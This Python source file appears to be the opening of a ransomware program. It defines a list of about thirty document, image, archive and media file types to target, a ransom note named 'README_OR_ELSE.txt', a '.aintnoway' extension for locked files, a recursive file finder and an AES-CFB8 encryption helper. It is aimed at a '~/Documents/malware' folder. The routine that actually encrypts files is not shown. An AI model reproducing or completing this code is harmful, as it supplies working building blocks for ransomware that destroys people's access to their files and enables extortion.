import os, base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

directory = os.path.expanduser('~/Documents/malware')
info_file = os.path.join(directory, "README_OR_ELSE.txt")
extensions = (".txt", ".doc", ".docx", ".pdf", ".rtf",
              ".xlsx", ".xls", ".csv", ".ppt", ".pptx",
              ".mdb", ".accdb", ".jpg", ".jpeg", ".png",
              ".gif", ".bmp", ".zip", ".rar", ".7z",
              ".tar", ".gz", ".tgz", ".mp3", ".wav",
              ".mp4", ".avi", ".mkv", ".mov", ".wmv")
custom_extension = ".aintnoway"

def find_files(extension_list):
    files = []
    for root, _, filenames in os.walk(directory):
        for filename in filenames:
            if filename.endswith(extension_list) and filename != os.path.basename(info_file):
                files.append(os.path.join(root, filename))
    return files


def aes_operation(key, data, mode):
    backend = default_backend()
    iv = os.urandom(16) if mode == 'enc' else data[:16]
    cipher = Cipher(algorithms.AES(key), modes.CFB8(iv), backend=backend)
    p = cipher.encryptor() if mode == 'enc' else cipher.decryptor()
    final = iv + (p.update(data) + p.finalize()) if mode == 'enc' else p.update(data[16:]) + p.finalize()
    return final